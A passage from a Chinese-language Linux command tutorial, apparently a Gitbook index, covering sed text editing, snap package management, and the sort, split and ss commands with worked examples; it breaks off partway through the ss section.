-e：多点编辑，可以执行多个子命令 -f：从脚本文件中读取命令（sed操作可以事先写入脚本，然后通过-f读取并执行） -l：指定行的长度 -n：屏蔽sed的默认输出功能 -i：修改源文件 -r：sed支持扩展正则 -{}:可组合多个命令 -p:打印行 -s:字符串替换 sed 's/ 旧 / 新 /' a.txt -d：删除行 #文本块处理：针对整行的插入追加替换操作 i: （insert）插入到行前 a: （append）追加到行后 c: （change）替换修改某行 r：从文件中读取输入行 w：另存为某文件 H：复制（模式空间追加复制 h：复制（模式空间覆盖 G：粘贴（保持空间追加模式空间 G：粘贴（保持空间覆盖模式空间 w 将所选的行写入文件 x 交换暂存缓冲区与模式空间的内容 y 将字符替换为另一字符（不能对正则表达式使用y命令） 4. 举例 4.1 p：打印行 $ sed '1p' /etc/rc.local #!/bin/bash # THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES # Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure # that this script will be executed during boot. touch /var/lock/subsys/local $ sed -n '1p' /etc/rc.local $打印单行 #!/bin/bash $ sed -n '1p;4p' /etc/rc.local $打印1和4行 #!/bin/bash # that this script will be executed during boot. $ sed -n '2,+3p' /etc/rc.local $打印从第二行数三行 # THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES # Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure # that this script will be executed during boot. touch /var/lock/subsys/local $ sed -n '/local$/p' /etc/rc.local $打印以local结尾的行 touch /var/lock/subsys/local $ sed -n 'p;n' /etc/rc.local $打印奇数行 #!/bin/bash # Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure touch /var/lock/subsys/local $ sed -n 'n;p' /etc/rc.local $打印偶数行 # THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES # that this script will be executed during boot. $ sed -n '$=' /etc/rc.local $显示函数 6 4.2 d：删除行 $ cat /etc/rc.local #!/bin/bash # THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES # Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure # that this script will be executed during boot. touch /var/lock/subsys/local $ sed '1,4d' /etc/rc.local $并未真1和4行删除 touch /var/lock/subsys/local $ cat /etc/rc.local #!/bin/bash # THIS FILE IS ADDED FOR COMPATIBILITY PURPOSES # Please note that you must run 'chmod +x /etc/rc.d/rc.local' to ensure # that this script will be executed during boot. touch /var/lock/subsys/local $ sed -i '1,4d' /etc/rc.local 真删除和4行 $ cat /etc/rc.local touch /var/lock/subsys/local 其他删除方法 sed '/init/d' /etc/rc.local $删除init的行 sed '/init/d;/bin/d' /etc/rc.local $删除init和bin的行 sed '/init/!d' /etc/rc.local $删除不包含init的行 sed '$d' /etc/rc.local $删除最后一行 sed '/^$/d' /etc/rc.local $删除空行 4.3 s：字符串替换 sed 's/ll/TARENA/' /etc/rc.local $替换所有行的第一“||” sed 's/ll/TARENA/g' /etc/rc.local $替换所有行所有的“||” sed '3s/script/SCRIPT/2' /etc/rc.local $替换第三那行的第二个“script” sed 's/init//g' /etc/rc.local $删除文件所有的“init” sed 's/script\\|stuff\\|e//g' /etc/rc.local $删除所有的“script”、所有的“stuff”、所有的字母e sed '3,5s/^#//' /etc/rc.local $解除/etc/rc.local文件第3~5行的注释（去掉开头的$ sed '6,7s/^/#/' /etc/rc.local $将/etc/rc.local文件的第6~7行注释掉（行首添加$ ） sed 's/.//2;s/.$//'/etc/rc.local $删除文件中每行的第二个、最后一个字符 替换指定行的下一行内容 $ cat test.txt i love you name id year //n命令-->移动到匹配行的下一行 sed -i '/i love you/{n;s/year/year1/;}' test.txt i love you name id year1 4.4 -r：sed支持扩展正则 sed -r 's/^(.)(.)(.*)/\\2\\1\\3/' /etc/rc.local $每行文本拆分为“第1个字符”“第2个字符”“剩下的所有字符”三个部分，然后通过替换操作重排顺序为“2-1-3 sed -r 's/^(.)(.*)(.)$/\\3\\2\\1/' /etc/rc.local $第一个字符和最后一个字符对调 sed -r 's/[0-9]//g;s/^( )+//' /etc/rc.local $删除所有数字、行首空格 sed 's/[A-Z]/(&)/g' /etc/rc.local $使用“&”可调用s替换操作中的整个查找串 sed -i '/^id:/s/3/5/' /etc/inittab $将默认运行级别修改为5 ----------查看效果grep \"^id:\" /etc/inittab cat /etc/sysconfig/network-scripts/ifcfg-eth0 sed '/^IPADDR/s/192.168.4.4/172.16.16.4/’/etc/sysconfig/network-scripts/ifcfg-eth0 | grep \"^IPADDR\" $将IP地址192.168.4.4修改为172.16.16.4 sed -r -i '/^IPADDR/s/192.168.4.(.*)/172.16.16.\\1/' /etc/sysconfig/network-scripts/ifcfg-eth0 $要求只修改网段地址时，可以利用扩展正则表达式的 \\1、\\2、……等调用，分别对应此前第1个、第2个、…… 以 ()包围的表达式所匹配的内容 grep \"^IPADDR\" /etc/sysconfig/network-scripts/ifcfg-eth0 sed -i 's#/var/www/html#/opt/wwwroo$' /etc/httpd/conf/httpd.conf $更改网站根目录 grep \"^DocumentRoot\" /etc/httpd/conf/httpd.conf $查看修改结果 4.5 多行注释 $ cat tt.txt Aprl:1000M:2000 Jan:400G:1000 Feb:30K:100\\ May:45K:111 $ sed '/Aprl/,+2s/\\(.*\\)/#&/' tt.txt #Aprl:1000M:2000 #Jan:400G:1000 #Feb:30K:100\\ May:45K:111 $ sed '/Aprl/,/Feb/s/\\(.*\\)/#&/' tt.txt #Aprl:1000M:2000 #Jan:400G:1000 #Feb:30K:100\\ May:45K:111 4.6 r：从文件中读取输入行 $ cat a.txt 192.168.1.110 www.baidu.com $ cat /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 192.168.1.120 oss.com $ sed '/oss/r a.txt' /etc/hosts 127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6 192.168.1.120 oss.com 192.168.1.110 www.baidu.com 4.7 w：另存为某文件 $ cat a.txt 192.168.1.110 www.baidu.com $ sed -i 'w c.txt' a.txt $ cat c.txt 192.168.1.110 www.baidu.com $ sed -i '/oss/w d.txt' /etc/hosts $ cat d.txt 192.168.1.120 oss.yun.ccb.com 4.8 H:h:G:g 复制粘贴 H：复制（模式空间追加复制 h：复制（模式空间覆盖 G：粘贴（保持空间追加模式空间 g：粘贴（保持空间覆盖模式空间 [root@monitor1 ~]# sed '1h;1g' mm aaaa bbbb cccc [root@monitor1 ~]# sed '1h;2g' mm aaaa aaaa cccc [root@monitor1 ~]# sed '1h;3g' mm aaaa bbbb aaaa [root@monitor1 ~]# sed '2h;1g' mm bbbb cccc [root@monitor1 ~]# sed '3h;1g' mm bbbb cccc [root@monitor1 ~]# sed '1H;1G' mm aaaa aaaa bbbb cccc [root@monitor1 ~]# sed '1H;2G' mm aaaa bbbb aaaa cccc [root@monitor1 ~]# sed '2H;1G' mm aaaa bbbb cccc 4.9 行前后添加 sed '1i 添加的内容' file $这是在第一行前添加字符串 sed '$i 添加的内容' file $这是在最后一行行前添加字符串 sed '$a添加的内容' file $这是在最后一行行后添加字符串 $ cat mm aaaa bbbb cccc $ sed '1i 0000' mm 0000 aaaa bbbb cccc $ sed '$i 0000' mm aaaa bbbb 0000 cccc $sed '$a 0000' mm aaaa bbbb cccc 0000 $ cat test aaa bbb ccc 有某aaa字符串行的下一行加 $ sed '/aaa/a111' test aaa 111 bbb ccc 有某aaa字符串行的上一行加 $ sed '/aaa/i111' test 111 aaa bbb ccc 4.10 多匹配模式 $ nl 1.txt 1 This is my cat,my cat's name is betty 2 This is my dog,my dog's name is frank 3 This is my fish, my fish's name is george 4 This is my goat,my goat's name is adam 4.11.1 管道多匹配 去掉 1.txt 中第三行及后面的内容，并把 name 替换成 mingzi： $ nl 1.txt | sed '3,$d' | sed 's/name/mingzi/g' 1 This is my cat,my cat's mingzi is betty 2 This is my dog,my dog's mingzi is frank 4.11.2 -e 多匹配 去掉 1.txt 中第三行及后面的内容，并把 name 替换成 mingzi： $ nl 1.txt | sed -e '3,$d' -e 's/name/mingzi/g' 1 This is my cat,my cat's mingzi is betty 2 This is my dog,my dog's mingzi is frank 4.12.3 ; 多匹配 去掉 1.txt 中第三行及后面的内容，并把 name 替换成 mingzi： $ nl 1.txt | sed '3,$d; s/name/mingzi/g' 1 This is my cat,my cat's mingzi is betty 2 This is my dog,my dog's mingzi is frank 图 1.2.66.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_snap.html":{"url":"Linux-Command/Linux_Command_snap.html","title":"Linux Command Snap","keywords":"","body":"Linux Command snap 软件包管理1. 简介2 安装 Snapd3. 管理 snaps3.1 查看已安装3.2 更新和恢复3.3 禁用/启用和删除3.4 从 Snap 运行应用程序3.5 创建和使用 Snap Aliases3.6 管理 Snap 的服务3.7 创建和管理 Snap 的快照Linux Command snap 软件包管理 tagsstart 软件包管理 tagsstop 1. 简介 在过去的几年里，Linux 社区在 Linux 系统上的包管理领域取得了一些显着的进步，特别是在通用或跨分发软件打包和分发方面。其中一项进步是由流行的Ubuntu Linux制造商Canonical开发的Snap包格式。 Snaps是跨发行版、无依赖关系且易于安装的应用程序，这些应用程序与所有依赖项打包在一起，可以在所有主要的 Linux 发行版上运行。从单个构建开始，一个 snap（应用程序）将在桌面、云和 IoT 上的所有受支持的 Linux 发行版上运行。支持的发行版包括 Ubuntu、Debian、Fedora、Arch Linux、Manjaro 和 CentOS/RHEL。 快照是安全的——它们被限制和沙盒化，因此它们不会危及整个系统。它们在不同的限制级别下运行（这是与基本系统和彼此隔离的程度）。更值得注意的是，每个快照都有一个由快照创建者根据快照的要求精心挑选的界面，以提供对其限制之外的特定系统资源的访问，例如网络访问、桌面访问等。 snap生态系统中的另一个重要概念是Channels。通道确定安装和跟踪哪个版本的快照以进行更新，它由跟踪、风险级别和分支组成并被细分。 snap包管理系统的主要组件有： snapd – 在 Linux 系统上管理和维护快照的后台服务。 snap – 应用程序包格式和命令行界面工具，用于安装和删除 snap 以及在 snap 生态系统中执行许多其他操作。 snapcraft – 用于构建快照的框架和强大的命令行工具。 snap store——开发者可以共享他们的 snap，Linux 用户可以搜索和安装它们的地方。 此外，快照也会自动更新。您可以配置更新发生的时间和方式。默认情况下，snapd守护程序每天最多检查四次更新：每次更新检查称为刷新。您也可以手动启动刷新。 2 安装 Snapd 如上所述，snapd守护进程是后台服务，它通过实施限制策略和控制允许 snap 访问特定系统资源的接口来管理和维护Linux 系统上的snap环境。它还提供snap命令并用于许多其他用途。 要在您的系统上安装snapd软件包，请为您的 Linux 发行版运行适当的命令。 ------------ [On Debian and Ubuntu] ------------ $ sudo apt update $ sudo apt install snapd ------------ [On Fedora Linux] ------------ # dnf install snapd ------------ [On CentOS and RHEL] ------------ # yum install epel-release # yum install snapd ------------ [On openSUSE - replace openSUSE_Leap_15.0 with the version] ------------ $ sudo zypper addrepo --refresh https://download.opensuse.org/repositories/system:/snappy/openSUSE_Leap_15.0 snappy $ sudo zypper --gpg-auto-import-keys refresh $ sudo zypper dup --from snappy $ sudo zypper install snapd ------------ [On Manjaro Linux] ------------ # pacman -S snapd ------------ [On Arch Linux] ------------ # git clone https://aur.archlinux.org/snapd.git # cd snapd # makepkg -si 在您的系统上安装snapd后，使用systemctl 命令启用管理主snap通信套接字的systemd单元，如下所示。 在Ubuntu及其衍生版本上，这应该由包安装程序自动触发。 $ sudo systemctl enable --now snapd.socket 请注意，如果snapd.socket未运行，则无法运行snap命令。运行以下命令以检查它是否处于活动状态并启用以在系统启动时自动启动。 $ sudo systemctl is-active snapd.socket $ sudo systemctl status snapd.socket $ sudo systemctl is-enabled snapd.socket 图 1.2.67.1：在这里插入图片描述 $ sudo ln -s /var/lib/snapd/snap /snap 要检查系统上安装的snapd和 snap 命令行工具的版本，请运行以下命令。 $ snap version 图 1.2.67.2：在这里插入图片描述 在安装snap之前，您可以检查它是否存在于 snap store 中。例如，如果应用程序属于“chat servers”或“media players”类别，您可以运行这些命令来搜索它，这将在稳定频道中向商店查询可用包。 $ snap find \"chat servers\" $ snap find \"media players\" 图 1.2.67.3：在这里插入图片描述 $ snap info rocketchat-server 图 1.2.67.4：在这里插入图片描述 $ sudo snap install rocketchat-server 您可以选择从不同的渠道安装：edge、beta或Candidate，出于某种原因，分别使用--edge、--beta或--candidate选项。或使用该--channel $ sudo snap install --edge rocketchat-server $ sudo snap install --beta rocketchat-server $ sudo snap install --candidate rocketchat-server 3. 管理 snaps 3.1 查看已安装 $ snap list 要列出正在使用的快照的当前版本，请指定其名称。您还可以通过添加--all选项列出其所有可用的修订。 $ snap list mailspring OR $ snap list --all mailspring 3.2 更新和恢复 refresh命令检查快照跟踪的通道，如果可用，它会下载并安装更新版本的快照。 $ sudo snap refresh mailspring OR $ sudo snap refresh #update all snaps on the local system 将应用程序更新到新版本后，您可以使用revert命令恢复到以前使用的版本。请注意，与软件关联的数据也将被还原。 $ sudo snap revert mailspring 现在，当您检查mailspring的所有修订版时，最新修订版被禁用，以前使用的修订版现在处于活动状态。 $ snap list --all mailspring 3.3 禁用/启用和删除 #禁用 $ sudo snap disable mailspring #开启 $ sudo snap enable mailspring #删除 $ sudo snap remove mailspring $ sudo snap remove --revision=482 mailspring 3.4 从 Snap 运行应用程序 snap可以提供您从图形用户界面或使用命令运行的单个应用程序（或一组应用程序）。默认情况下，所有与 snap 关联的应用程序都安装在基于 Debian 的发行版的/snap/bin/目录下，以及基于RHEL 的发行版的/var/lib/snapd/snap/bin/目录下。 $ ls /snap/bin/ OR # ls /var/lib/snapd/snap/bin/ 例如，要从命令行运行应用程序，只需输入其绝对路径名。 $ /snap/bin/mailspring OR # /var/lib/snapd/snap/bin/mailspring 要仅输入应用程序名称而不输入其完整路径名，请确保/snap/bin/或/var/lib/snapd/snap/bin/在您的PATH环境变量中（默认情况下应添加）。 # echo $PATH 如果/snap/bin/或/var/lib/snapd/snap/bin/目录在您的PATH中，您只需键入应用程序的名称/命令即可运行应用程序： $ mailspring 查看snap下可用的命令，请运行“ snap info snap-name ”命令，然后查看以下屏幕截图中突出显示的命令部分。 $ snap info mailspring which命令查找应用程序或命令的绝对路径名。 which mailspring 3.5 创建和使用 Snap Aliases Snap还支持为应用程序创建别名。快照的默认（或标准）别名在启用之前必须经过公共审查过程，但您可以为本地系统创建别名。 您可以使用alias 命令为快照创建别名。 snap alias mailspring mls 要列出快照的别名，例如mailspring，请运行以下命令。从现在开始，您可以使用别名来运行 snap。 snap aliases mailspring 要删除snap的别名，请使用unalias命令。 snap unalias mls 3.6 管理 Snap 的服务 对于某些快照，底层功能通过作为守护程序或服务运行的应用程序公开，一旦安装快照，它们会自动启动在后台连续运行。此外，这些服务还可以在系统启动时自动启动。重要的是，单个快照可能包含多个应用程序和服务，它们协同工作以提供该快照的整体功能。 snap info rocketchat-server 您可以使用services命令交叉检查服务的快照。命令输出显示一个服务，它是否启用在系统启动时自动启动，以及它是否处于活动状态。 snap services rocketchat-server 要停止服务运行，例如Rocketchat，请使用stop命令。请注意，不建议执行此操作，因为手动停止快照服务可能会导致快照发生故障。 snap stop rocketchat-server 要启动服务，例如，rocketchat使用start命令。 snap start rocketchat-server 要使服务在系统引导时自动启动，请使用enable命令。 snap enable rocketchat-server 要防止服务在下次系统引导时自动启动，请使用disable命令。 snap disable rocketchat-server 要查看服务的日志，请使用带有-f选项的log命令，它允许您实时查看屏幕上的日志。 snap logs rocketchat-server OR snap logs -f rocketchat-server 3.7 创建和管理 Snap 的快照 Snapd为一个或多个快照存储用户、系统和配置数据的副本。您可以手动触发或将其设置为自动工作。这样，您可以备份快照的状态，将其恢复到以前的状态，以及将全新的快照安装恢复到以前保存的状态。 要手动生成快照，请使用“ snap save ”命令。要为mailspring创建快照，请运行以下命令： snap save mailspring 如果未指定快照名称，snapd将为所有已安装的快照生成快照（添加--no-wait选项以在后台运行进程以释放终端并允许您运行其他命令）。 snap save 要查看所有快照的状态，请使用saved命令。您可以使用该--id标志来显示特定快照的状态： snap saved OR snap saved --id=2 您可以使用check-snapshot命令和快照标识符（集 ID）验证快照的完整性： snap check-snapshot 2 要使用特定快照中的相应数据恢复当前用户、系统和配置数据，请使用restore命令并指定快照集 ID： snap restore 2 要从系统中删除快照，请使用forget命令。默认情况下会删除所有快照的数据，您可以指定快照仅删除其数据。 snap forget 2 OR snap forget 2 mailspring ✈推荐阅读： linux snap docs linux yum linux apt linux dnf Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_sort.html":{"url":"Linux-Command/Linux_Command_sort.html","title":"Linux Command Sort","keywords":"","body":"linux Command sort 排序1. 简介2. 参数3. 示例1 默认2 -k 设置列3. -u 去除重复行4. -r 降序5. -o 重定向文件6. -n 数值排序7. -t -k8. 综合linux Command sort 排序 tagsstart 文件管理 tagsstop 图 1.2.68.1：在这里插入图片描述 1. 简介 Linux sort 命令用于将文本文件内容加以排序。 sort 可针对文本文件的内容，以行为单位来排序。 2. 参数 -b 忽略每行前面开始出的空格字符。 -c 会检查文件是否已排好序，如果乱序，则输出第一个乱序的行的相关信息，最后返回1 -C 会检查文件是否已排好序，如果乱序，不输出内容，仅返回1 -d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。 -f 排序时，将小写字母视为大写字母。 -i 排序时，除了040至176之间的ASCII字符外，忽略其他的字符。 -m 将几个排序好的文件进行合并。 -M 将前面3个字母依照月份的缩写进行排序。比如JAN小于FEB等等 -n 依照数值的大小排序。 -u 意味着是唯一的(unique)，输出的结果是去完重了的。 -o 将排序后的结果存入指定的文件。 -r 以相反的顺序来排序。 -t 指定排序时所用的栏位分隔字符。 +- 以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。 --help 显示帮助。 --version 显示版本信息。 [-k field1[,field2]] 按指定的列进行排序。 3. 示例 1 默认 $ cat testfile # testfile文件原有排序 test 30 Hello 95 Linux 85 $ sort testfile # 重排结果 Hello 95 Linux 85 test 30 2 -k 设置列 使用 -k 参数设置对第二列的值进行重排，结果如下： $ sort testfile -k 2 test 30 Linux 85 Hello 95 3. -u 去除重复行 [rocrocket@rocrocket programming]$ cat seq.txt banana apple pear orange pear [rocrocket@rocrocket programming]$ sort seq.txt apple banana orange pear pear [rocrocket@rocrocket programming]$ sort -u seq.txt apple banana orange pear 4. -r 降序 sort默认的排序方式是升序，如果想改成降序，就加个-r就搞定了。 [rocrocket@rocrocket programming]$ cat number.txt 1 3 5 2 4 [rocrocket@rocrocket programming]$ sort number.txt 1 2 3 4 5 [rocrocket@rocrocket programming]$ sort -r number.txt 5 4 3 2 1 5. -o 重定向文件 由于sort默认是把结果输出到标准输出，所以需要用重定向才能将结果写入文件，形如sort filename > newfile。 但是，如果你想把排序结果输出到原文件中，用重定向可就不行了。 [rocrocket@rocrocket programming]$ sort -r number.txt > number.txt [rocrocket@rocrocket programming]$ cat number.txt [rocrocket@rocrocket programming]$ 看，竟然将number清空了。 就在这个时候，-o选项出现了，它成功的解决了这个问题，让你放心的将结果写入原文件。这或许也是-o比重定向的唯一优势所在。 rocrocket@rocrocket programming]$ cat number.txt 1 3 5 2 4 [rocrocket@rocrocket programming]$ sort -r number.txt -o number.txt [rocrocket@rocrocket programming]$ cat number.txt 5 4 3 2 1 6. -n 数值排序 你有没有遇到过10比2小的情况。我反正遇到过。出现这种情况是由于排序程序将这些数字按字符来排序了，排序程序会先比较1和2，显然1小，所以就将10放在2前面喽。这也是sort的一贯作风。 我们如果想改变这种现状，就要使用-n选项，来告诉sort，“要以数值来排序” [rocrocket@rocrocket programming]$ cat number.txt 1 10 19 11 2 5 [rocrocket@rocrocket programming]$ sort number.txt 1 10 11 19 2 5 [rocrocket@rocrocket programming]$ sort -n number.txt 1 2 5 10 11 19 7. -t -k [rocrocket@rocrocket programming]$ cat facebook.txt banana:30:5.5 apple:10:2.5 pear:90:2.3 orange:20:3.4 这个文件有三列，列与列之间用冒号隔开了，第一列表示水果类型，第二列表示水果数量，第三列表示水果价格。 那么我想以水果数量来排序，也就是以第二列来排序，如何利用sort实现？ [rocrocket@rocrocket programming]$ sort -n -k 2 -t : facebook.txt apple:10:2.5 orange:20:3.4 banana:30:5.5 pear:90:2.3 我们使用冒号作为间隔符，并针对第二列来进行数值升序排序，结果很令人满意。 8. 综合 $ cat facebook.txt google 110 5000 baidu 100 5000 guge 50 3000 sohu 100 4500 第一个域是公司名称，第二个域是公司人数，第三个域是员工平均工资 我想让这个文件按公司的字母顺序排序，也就是按第一个域进行排序 $ sort -t ‘ ‘ -k 1 facebook.txt baidu 100 5000 google 110 5000 guge 50 3000 sohu 100 4500 我想让facebook.txt按照公司人数排序 $ sort -n -t ‘ ‘ -k 2 facebook.txt guge 50 3000 baidu 100 5000 sohu 100 4500 google 110 5000 我想让facebook.txt按照公司人数排序 ，人数相同的按照员工平均工资升序排序 $ sort -n -t ‘ ‘ -k 2 -k 3 facebook.txt guge 50 3000 sohu 100 4500 baidu 100 5000 google 110 5000 我想让facebook.txt按照员工工资降序排序，如果员工人数相同的，则按照公司人数升序排序 $ sort -n -t ‘ ‘ -k 3r -k 2 facebook.txt baidu 100 5000 google 110 5000 sohu 100 4500 guge 50 3000 $ sort -t ‘ ‘ -k 3nr -k 2n facebook.txt baidu 100 5000 google 110 5000 sohu 100 4500 guge 50 3000 突发奇想，从公司英文名称的第二个字母开始进行排序 $ sort -t ‘ ‘ -k 1.2 facebook.txt baidu 100 5000 sohu 100 4500 google 110 5000 guge 50 3000 我们使用了-k 1.2，这就表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序。你会发现baidu因为第二个字母是a而名列榜首。sohu和 google第二个字符都是o，但sohu的h在google的o前面，所以两者分别排在第二和第三。guge只能屈居第四了。 只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序 $ sort -t ‘ ‘ -k 1.2,1.2 -k 3,3nr facebook.txt baidu 100 5000 google 110 5000 sohu 100 4500 guge 50 3000 由于只对第二个字母进行排序，所以我们使用了-k 1.2,1.2的表示方式，表示我们“只”对第二个字母进行排序。（如果你问“我使用-k 1.2怎么不行？”，当然不行，因为你省略了End部分，这就意味着你将对从第二个字母起到本域最后一个字符为止的字符串进行排序）。对于员工工资进行排 序，我们也使用了-k 3,3，这是最准确的表述，表示我们“只”对本域进行排序，因为如果你省略了后面的3，就变成了我们“对第3个域开始到最后一个域位置的内容进行排序” 了。 -k和-u联合 $ cat facebook.txt google 110 5000 baidu 100 5000 guge 50 3000 sohu 100 4500 这是最原始的facebook.txt文件。 $ sort -n -k 2 facebook.txt guge 50 3000 baidu 100 5000 sohu 100 4500 google 110 5000 $ sort -n -k 2 -u facebook.txt guge 50 3000 baidu 100 5000 google 110 5000 当设定以公司员工域进行数值排序，然后加-u后，sohu一行就被删除了！原来-u只识别用-k设定的域，发现相同，就将后续相同的行都删除。 $ sort -k 1 -u facebook.txt baidu 100 5000 google 110 5000 guge 50 3000 sohu 100 4500 $ sort -k 1.1,1.1 -u facebook.txt baidu 100 5000 google 110 5000 sohu 100 4500 这个例子也同理，开头字符是g的guge就没有幸免于难。 $ sort -n -k 2 -k 3 -u facebook.txt guge 50 3000 sohu 100 4500 baidu 100 5000 google 110 5000 咦！这里设置了两层排序优先级的情况下，使用-u就没有删除任何行。原来-u是会权衡所有-k选项，将都相同的才会删除，只要其中有一级不同都不会轻易删除的:)（不信，你可以自己加一行sina 100 4500试试看 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:19:37 "},"Linux-Command/Linux_Command_split.html":{"url":"Linux-Command/Linux_Command_split.html","title":"Linux Command Split","keywords":"","body":"Linux Command split 切割文件1. 简介2. 参数3. 举例3.2 默认切割3.2 --verbose 创建文件块时看到反馈3.3 原始文件分割并命名为 bigfile.aa、bigfile.ab3.4 -b 指定文件块的大小3.5 -l 根据文件行数来分割文件3.6 cat 合并与原文件无差别3.7 -d 用数字后缀Linux Command split 切割文件 tagsstart 文件管理 tagsstop 图 1.2.69.1：在这里插入图片描述 1. 简介 split命令可以将一个大文件分割成很多个小文件，有时需要将文件分割成更小的片段，比如为提高可读性，生成日志等。 2. 参数 -a, --suffix-length=N use suffixes of length N (default 2) #输出文件后缀长度，默认为：2 -b, --bytes=SIZE put SIZE bytes per output file #按照文件大小分割文件，单位：字节 一个字节 = 8位二进制数（1byte == 8bit） ASCII码：一个英文字母（不分大小写）占一个字节的空间，一个中文汉字占两个字节的空间 UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体，及中文标点）等于三个字节 Unicode编码：一个英文（含标点）等于两个字节，一个中文（含繁体，及中文标点）等于两个字节 -d, --numeric-suffixes use numeric suffixes instead of alphabetic #添加数字后缀（因为默认添加的是字母后缀，所有要想加数字需要自己添加） -l, --lines=NUMBER put NUMBER lines per output file #按照行数分割文件，默认1000行一个文件 --verbose print a diagnostic just before each output file is opened #打印运行状态信息 --help display this help and exit 查看说明文档 --version output version information and exit 查看版本信息 3. 举例 3.2 默认切割 默认情况下，split 命令使用非常简单的命名方案。文件块将被命名为 xaa、xab、xac 等，并且，大概地，如果你将足够大的文件分割，你甚至可能会得到名为 xza 和 xzz 的块。 除非你要求，否则该命令将无任何反馈地运行。 $ split bigfile 3.2 --verbose 创建文件块时看到反馈 $ split –-verbose bigfile creating file 'xaa' creating file 'xab' creating file 'xac' 3.3 原始文件分割并命名为 bigfile.aa、bigfile.ab $ split –-verbose bigfile bigfile. creating file 'bigfile.aa' creating file 'bigfile.ab' creating file 'bigfile.ac' 请注意，上述命令中显示的前缀的末尾会添加一个点。否则，文件将是 bigfileaa 之类的名称，而不是 bigfile.aa。 请注意，split 命令不会删除你的原始文件，只是创建了文件块。 3.4 -b 指定文件块的大小 $ split -b100M bigfile 文件大小可以是 KB、MB，GB，最大可以是 YB！只需使 K、M、G、T、P、E、Z 和 Y 这些合适的字母。 3.5 -l 根据文件行数来分割文件 每个文件将有 1000 行 $ split --verbose -l1000 logfile log. creating file 'log.aa' creating file 'log.ab' creating file 'log.ac' creating file 'log.ad' creating file 'log.ae' creating file 'log.af' creating file 'log.ag' creating file 'log.ah' creating file 'log.ai' creating file 'log.aj' 3.6 cat 合并与原文件无差别 $ split --verbose -b50K zip zip. creating file 'zip.aa' creating file 'zip.ab' creating file 'zip.ac' creating file 'zip.ad' creating file 'zip.ae' $ cat zip.a? > zip.new $ diff zip zip.new $ 3.7 -d 用数字后缀 同时可以使用-a length来指定后缀的长度： $ split -b 10k date.file -d -a 3 $ ls date.file x000 x001 x002 x003 x004 x005 x006 x007 x008 x009 为分割后的文件指定文件名的前缀： $ split -b 10k date.file -d -a 3 split_file $ ls date.file split_file000 split_file001 split_file002 split_file003 split_file004 split_file005 split_file006 split_file007 split_file008 split_file009 更多阅读： Split Command in Linux with Examples split(1) — Linux manual page Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_ss.html":{"url":"Linux-Command/Linux_Command_ss.html","title":"Linux Command Ss","keywords":"","body":"Linux Command ss1. 简介2. 参数3.示例3.1 默认显示3.2 查看主机监听的端口3.3 通过 -r 选项解析 IP 和端口号3.4 使用 -p 选项查看监听端口的程序名称3.5 -a –all 对 TCP 协议来说，既包含监听的端口，也包含建立的连接3.6 dst/src dport/sport 语法3.7 用TCP 状态过滤Sockets3.8 显示TCP连接3.9 显示 Sockets 摘要3.10 列出所有打开的网络连接端口3.11 查看进程使用的socket3.12 显示所有UDP Sockets3.13 所有端口为 22（ssh）的连接Linux Command ss tagsstart 网络 分析 tagsstop 1. 简介 ss 是 Socket Statistics 的缩写。ss 命令可以用来获取 socket 统计信息，它显示的内容和 netstat 类似。但 ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，而且比 netstat 更快。当服务器的 socket 连接数量变得非常大时，无论是使用 netstat 命令还是直接 cat /proc/net/tcp，执行速度都会很慢。ss 命令利用到了 TCP 协议栈中 tcp_diag。tcp_diag 是一个用于分析统计的模块，可以获得 Linux 内核中第一手的信息，因此 ss 命令的性能会好很多 2. 参数 常用选项 -h, –help 帮助 -V, –version 显示版本号 -t, –tcp 显示 TCP 协议的 sockets -u, –udp 显示 UDP 协议的 sockets -x, –unix 显示 unix domain sockets，与 -f 选项相同 -n, –numeric 不解析服务的名称，如 “22” 端口不会显示成 “ssh” -l, –listening 只显示处于监听状态的端口 -p, –processes 显示监听端口的进程(Ubuntu 上需要 sudo) -a, –all 对 TCP 协议来说，既包含监听的端口，也包含建立的连接 -r, –resolve 把 IP 解释为域名，把端口号解释为协议名称 -o, –options 显示时间信息 -m, –memory 显示 socket 使用的内存 -i, –info 显示更多 TCP 内部的信息 -s 显示概要信息 3.示例 3.1 默认显示 如果不添加选项 ss 命令默认输出所有建立的连接(不包含监听的端口)，包括 tcp, udp, and unix socket 三种类型的连接： [root@master ~]# ss | head -n 5 Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port u_str ESTAB 0 0 * 49344 * 49345 u_str ESTAB 0 0 * 49311 * 49312 u_str ESTAB 0 0 * 49341 * 49342 u_str ESTAB 0 0 * 49312 * 49311 3.2 查看主机监听的端口 # 显示端口的服务名 [root@master ~]# ss -tl State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:sunrpc *:* LISTEN 0 128 *:ssh *:* LISTEN 0 100 127.0.0.1:smtp *:* LISTEN 0 128 :::sunrpc :::* LISTEN 0 128 :::ssh :::* LISTEN 0 100 ::1:smtp :::* #显示端口号 [root@master ~]# ss -tnl State Recv-Q Send-Q Local 